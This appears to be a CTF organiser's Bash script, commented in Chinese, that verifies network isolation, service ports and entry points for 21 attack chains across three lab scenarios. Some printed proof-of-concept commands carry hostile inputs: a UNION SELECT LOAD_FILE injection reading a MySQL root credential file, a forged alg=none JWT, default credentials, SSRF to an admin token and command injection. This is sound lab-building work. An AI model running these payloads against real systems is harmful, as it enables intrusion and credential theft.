#!/bin/bash
# ============================================
# CTF 验证脚本 — 网络/服务/攻击链
# 用法:
#   ./verify.sh network    — 网络连通性检查
#   ./verify.sh services   — 服务端口检查
#   ./verify.sh chains     — 攻击链可达性检查
#   ./verify.sh all        — 全部检查
# ============================================
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "${SCRIPT_DIR}/config.env"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

pass() { echo -e "${GREEN}[PASS]${NC} $*"; }
fail() { echo -e "${RED}[FAIL]${NC} $*"; }
info() { echo -e "${YELLOW}[INFO]${NC} $*"; }

MODE="${1:-all}"

# ==========================================
# 网络连通性检查
# ==========================================
check_network() {
    echo "========================================"
    echo " 网络连通性检查"
    echo "========================================"
    echo ""

    # 检查bridge存在
    for BR in "$BR_EXT" "$BR_A" "$BR_B" "$BR_C"; do
        if ip link show "$BR" &>/dev/null; then
            pass "Bridge $BR 存在"
        else
            fail "Bridge $BR 不存在"
        fi
    done

    echo ""

    # 检查host能ping通Internal VM
    declare -A INT_IPS
    INT_IPS[a2]="192.168.100.2"
    INT_IPS[b2]="192.168.110.2"
    INT_IPS[c2]="192.168.120.2"
    INT_IPS[a1]="192.168.100.1"
    INT_IPS[b1]="192.168.110.1"
    INT_IPS[c1]="192.168.120.1"

    for VM in a1 a2 b1 b2 c1 c2; do
        IP="${INT_IPS[$VM]}"
        if ping -c 1 -W 2 "$IP" &>/dev/null; then
            pass "VM-$VM ($IP) 可达"
        else
            info "VM-$VM ($IP) 不可达 — VM可能未运行或网络未配置"
        fi
    done

    echo ""
    echo "[*] 跨场景隔离验证 (A不能访问B/C, B不能访问A/C, C不能访问A/B):"
    info "手动验证: 从VM-A1执行 ping 192.168.110.1 (应不通)"
}

# ==========================================
# 服务端口检查
# ==========================================
check_services() {
    echo "========================================"
    echo " 服务端口检查"
    echo "========================================"
    echo ""

    # VM-A1 (DMZ) — 通过内网IP或外网IP检查
    echo "--- VM-A1 (DMZ) ---"
    for host in "192.168.100.1" "192.168.100.2" "192.168.110.1" "192.168.110.2" "192.168.120.1" "192.168.120.2"; do
        if ! ping -c 1 -W 1 "$host" &>/dev/null; then
            continue  # 跳过不可达主机
        fi

        case "$host" in
            192.168.100.1)
                echo "  VM-A1 ($host):"
                nc -z -w 2 "$host" 80 2>/dev/null && pass "  :80 nginx/PbootCMS" || fail "  :80 nginx/PbootCMS"
                ;;
            192.168.100.2)
                echo "  VM-A2 ($host):"
                nc -z -w 2 "$host" 3306 2>/dev/null && pass "  :3306 MySQL" || fail "  :3306 MySQL"
                nc -z -w 2 "$host" 6379 2>/dev/null && pass "  :6379 Redis" || fail "  :6379 Redis"
                nc -z -w 2 "$host" 8090 2>/dev/null && pass "  :8090 Confluence" || fail "  :8090 Confluence"
                nc -z -w 2 "$host" 22 2>/dev/null   && pass "  :22 SSH" || fail "  :22 SSH"
                ;;
            192.168.110.1)
                echo "  VM-B1 ($host):"
                nc -z -w 2 "$host" 80 2>/dev/null && pass "  :80 nginx/Monitor" || fail "  :80 nginx/Monitor"
                ;;
            192.168.110.2)
                echo "  VM-B2 ($host):"
                nc -z -w 2 "$host" 5432 2>/dev/null && pass "  :5432 PostgreSQL" || fail "  :5432 PostgreSQL"
                nc -z -w 2 "$host" 8080 2>/dev/null && pass "  :8080 API Gateway" || fail "  :8080 API Gateway"
                nc -z -w 2 "$host" 8081 2>/dev/null && pass "  :8081 Jenkins" || fail "  :8081 Jenkins"
                ;;
            192.168.120.1)
                echo "  VM-C1 ($host):"
                nc -z -w 2 "$host" 80 2>/dev/null && pass "  :80 nginx/RuoYi" || fail "  :80 nginx/RuoYi"
                nc -z -w 2 "$host" 8081 2>/dev/null && pass "  :8081 Roundcube" || fail "  :8081 Roundcube"
                ;;
            192.168.120.2)
                echo "  VM-C2 ($host):"
                nc -z -w 2 "$host" 389 2>/dev/null  && pass "  :389 LDAP" || fail "  :389 LDAP"
                nc -z -w 2 "$host" 445 2>/dev/null  && pass "  :445 Samba" || fail "  :445 Samba"
                nc -z -w 2 "$host" 3306 2>/dev/null && pass "  :3306 MySQL" || fail "  :3306 MySQL"
                nc -z -w 2 "$host" 80 2>/dev/null   && pass "  :80 Drupal" || fail "  :80 Drupal"
                ;;
        esac
        echo ""
    done
}

# ==========================================
# 攻击链验证 (输出POC命令)
# ==========================================
check_chains() {
    echo "========================================"
    echo " 攻击链验证 (21条)"
    echo "========================================"
    echo " 以下检查每条攻击链的入口点是否可达"
    echo " ✓ = 入口可达, ✗ = 入口不可达, ? = 需手动验证"
    echo ""

    TOTAL_PASS=0
    TOTAL_FAIL=0
    TOTAL_MANUAL=0

    check_chain() {
        local id="$1" name="$2" pts="$3" cmd="$4"
        printf "[%s] %s (%s分)\n" "$id" "$name" "$pts"
        printf "    %s\n" "$cmd"
        if [ -n "$5" ]; then
            printf "    -> "
            eval "$5" 2>/dev/null && { pass ""; TOTAL_PASS=$((TOTAL_PASS+1)); } || { info "需手动验证"; TOTAL_MANUAL=$((TOTAL_MANUAL+1)); }
        else
            info "需手动验证"
            TOTAL_MANUAL=$((TOTAL_MANUAL+1))
        fi
        echo ""
    }

    # ==================== 场景A (8链, 1610分) ====================
    echo "===== 场景A: 融媒体内容管理系统 ====="
    echo "  DMZ (A1): PbootCMS魔改版 + Flask media-api"
    echo "  Internal (A2): MySQL + Redis + Confluence 7.13.6"
    echo ""

    # 确定A1可达IP
    A1_HOST="192.168.100.1"
    A2_HOST="192.168.100.2"

    check_chain "A-1" "备份文件泄露" "20" \
        "curl http://${A1_HOST}/backup/" \
        "curl -s -o /dev/null -w '%{http_code}' http://${A1_HOST}/backup/ 2>/dev/null | grep -q 200"

    check_chain "A-2" "搜索框SQL注入" "200" \
        "curl 'http://${A1_HOST}/?search/' -X POST -d 'keyword=test'" \
        "curl -s -o /dev/null -w '%{http_code}' http://${A1_HOST}/ 2>/dev/null | grep -q 200"

    check_chain "A-3" "源码泄露database.php" "50" \
        "curl http://${A1_HOST}/config/database.php" \
        ""

    check_chain "A-4" "MySQL LOAD_FILE" "250" \
        "curl 'http://${A1_HOST}/?search/' -X POST -d \"keyword=' UNION SELECT LOAD_FILE('/etc/mysql/mysql.conf.d/root.cnf')--\"" \
        "nc -z -w 2 ${A2_HOST} 3306 2>/dev/null && echo pass || echo fail"

    check_chain "A-5" "UEditor文件上传" "250" \
        "curl http://${A1_HOST}/static/upload/ -X OPTIONS" \
        ""

    check_chain "A-6" "SUID find提权" "100" \
        "ssh operator@${A1_HOST} 'find / -perm -u=s -type f 2>/dev/null | grep find'" \
        ""

    check_chain "A-7" "Confluence CVE-2022-26134" "500" \
        "curl -s http://${A2_HOST}:8090/ 2>/dev/null | head -5" \
        "nc -z -w 2 ${A2_HOST} 8090 2>/dev/null && echo pass || echo fail"

    check_chain "A-8" "cron脚本提权" "240" \
        "ssh operator@${A2_HOST} 'ls -la /opt/confluence_health_check.sh'" \
        ""

    # ==================== 场景B (8链, 1590分) ====================
    echo "===== 场景B: 广电网络监控仪表盘 ====="
    echo "  DMZ (B1): Flask Monitor + nginx"
    echo "  Internal (B2): PostgreSQL + Go API Gateway + Jenkins 2.441"
    echo ""

    B1_HOST="192.168.110.1"
    B2_HOST="192.168.110.2"

    check_chain "B-1" "默认口令登录" "20" \
        "curl -X POST http://${B1_HOST}/api/login -d '{\"username\":\"admin\",\"password\":\"admin123\"}'" \
        "curl -s -o /dev/null -w '%{http_code}' http://${B1_HOST}/api/login 2>/dev/null | grep -qE '200|302|405'"

    check_chain "B-2" "SSRF获取JWT" "200" \
        "curl 'http://${B1_HOST}/api/fetch?url=http://${B2_HOST}:8080/api/admin/token'" \
        ""

    check_chain "B-3" "Flask命令注入" "300" \
        "curl 'http://${B1_HOST}/api/exec' -X POST -d '{\"cmd\":\"id\"}'" \
        ""

    check_chain "B-4" "配置文件泄露PG只读" "100" \
        "cat /opt/configs/api_config.yaml (on B1)" \
        ""

    check_chain "B-5" "env泄露PG superuser" "100" \
        "ssh operator@${B1_HOST} 'cat /etc/systemd/system/monitor-dashboard.service'" \
        ""

    check_chain "B-6" "crontab提权" "100" \
        "ssh operator@${B1_HOST} 'ls -la /opt/monitor/cleanup.sh'" \
        ""

    check_chain "B-7" "Jenkins CVE-2024-23897" "500" \
        "curl -s http://${B2_HOST}:8081/ 2>/dev/null | head -5" \
        "nc -z -w 2 ${B2_HOST} 8081 2>/dev/null && echo pass || echo fail"

    check_chain "B-8" "Jenkins backup提权" "270" \
        "ssh operator@${B2_HOST} 'ls -la /opt/jenkins_backup.sh'" \
        ""

    # ==================== 场景C (8链, 1590分) ====================
    echo "===== 场景C: 内部办公OA系统 ====="
    echo "  DMZ (C1): RuoYi OA + Roundcube"
    echo "  Internal (C2): LDAP + Samba + MySQL + Drupal 7.57"
    echo ""

    C1_HOST="192.168.120.1"
    C2_HOST="192.168.120.2"

    check_chain "C-1" "注册captcha后门" "20" \
        "curl 'http://${C1_HOST}/register' -F 'captcha=gdj2024' -F 'username=test' -F 'password=Test@123'" \
        ""

    check_chain "C-2" "JWT alg=none伪造" "300" \
        "curl -s http://${C1_HOST}/api/admin/users -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VySWQiOjF9.'" \
        ""

    check_chain "C-3" "/api/admin/export SQL注入" "250" \
        "curl 'http://${C1_HOST}/api/admin/export?username=admin'" \
        ""

    check_chain "C-4" "druid配置泄露" "50" \
        "curl http://${C1_HOST}/druid/datasource.json" \
        ""

    check_chain "C-5" "FreeMarker SSTI RCE" "350" \
        "curl 'http://${C1_HOST}/mail/preview' -X POST -d '{\"template\":\"test\"}'" \
        "nc -z -w 2 ${C2_HOST} 80 2>/dev/null && echo pass || echo fail"

    check_chain "C-6" "sudo tee提权" "100" \
        "ssh tomcat@${C1_HOST} 'sudo -l' 2>/dev/null" \
        ""

    check_chain "C-7" "Drupal CVE-2018-7600" "500" \
        "curl -s http://${C2_HOST}/ 2>/dev/null | head -5" \
        "nc -z -w 2 ${C2_HOST} 80 2>/dev/null && echo pass || echo fail"

    check_chain "C-8" "sudo find提权" "150" \
        "ssh operator@${C2_HOST} 'sudo -l' 2>/dev/null" \
        ""

    echo ""
    echo "========================================"
    echo " 攻击链验证汇总"
    echo "========================================"
    echo -e "  ${GREEN}入口可达: $TOTAL_PASS${NC}"
    echo -e "  ${YELLOW}需手动验证: $TOTAL_MANUAL${NC}"
    echo ""
    echo "总分: 4790 分 | 21条攻击链"
}

# ==========================================
# 赛后重置
# ==========================================
check_reset() {
    echo "========================================"
    echo " 赛后重置 (清理webshell/恢复数据)"
    echo "========================================"
    echo ""

    echo "[+] 重新导入数据库..."
    echo "  VM-A2: scp init_db.sql → mysql cms < init_db.sql"
    echo "  VM-C1: scp init_db.sql → mysql ry < quartz.sql + ry_20260319.sql"
    echo "  VM-C2: scp init_db.sql → mysql oa < init_db.sql"

    echo ""
    echo "[+] 清理webshell目录..."
    echo "  find /var/www -name '*.phtml' -delete"
    echo "  find /var/www -name '*.jsp' -delete"
    echo "  find /opt -name 'webshell*' -delete"

    echo ""
    echo "[+] 重启所有服务..."
    for VM in a1 a2 b1 b2 c1 c2; do
        echo "  virsh reboot ctfd-${VM}"
    done

    echo ""
    echo "[+] 清理crontab..."
    echo "  检查/etc/cron.d/中的恶意条目"
    echo "  检查/var/spool/cron/crontabs/"
}

# ==========================================
# Main
# ==========================================
case "$MODE" in
    network)
        check_network
        ;;
    services)
        check_services
        ;;
    chains)
        check_chains
        ;;
    reset)
        check_reset
        ;;
    all)
        check_network
        echo ""
        check_services
        echo ""
        check_chains
        ;;
    *)
        echo "用法: $0 {network|services|chains|reset|all}"
        exit 1
        ;;
esac
